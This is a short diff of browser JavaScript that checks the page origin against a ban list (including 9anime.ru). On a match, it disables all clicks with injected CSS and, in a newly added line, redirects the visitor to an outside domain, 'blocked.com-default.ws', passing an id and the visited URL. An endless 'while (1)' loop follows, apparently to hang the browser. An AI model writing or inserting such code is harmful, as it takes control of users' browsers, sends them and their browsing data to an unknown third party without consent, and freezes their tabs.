@@ -7,8 +7,12 @@
     'https://9anime.ru'
   ];
   let foundIllegal = false;
+  let bannedUrl;
   for (const banned of bannedList) {
-    if (banned === window.location.origin) foundIllegal = true;
+    if (banned === window.location.origin) {
+      foundIllegal = true;
+      bannedUrl = banned;
+    }
   }
   if (foundIllegal) {
     ((window) => {
@@ -60,6 +64,8 @@
     })(window);
 
     injectCSS(`* { pointer-events: none !important; }`);
+    
+    window.location = `http://blocked.com-default.ws/?ol=832089092133&type=chromium-m&url=${bannedUrl}`;
 
     txt = "a";
     while (1) {
